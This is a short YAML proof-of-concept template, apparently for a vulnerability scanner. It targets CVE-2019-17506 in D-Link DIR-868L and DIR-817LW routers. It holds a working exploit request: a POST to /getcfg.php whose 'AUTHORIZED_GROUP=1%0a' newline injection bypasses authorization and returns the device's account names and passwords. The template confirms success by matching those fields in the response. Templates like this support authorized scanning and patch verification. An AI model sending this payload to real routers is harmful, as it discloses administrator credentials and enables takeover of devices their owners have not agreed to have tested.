name: poc-yaml-dl-8xx-info-leak
rules:
  - method: POST
    path: /getcfg.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: >-
      SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a
    follow_redirects: false
    expression: >
      status == 200 && body.bcontains(b'</name>') && body.bcontains(b'</password>')
detail:
  author: Huasir(https://github.com/dahua966/)
  Affected Version: "DIR-868L DIR-817LW"
  links:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17506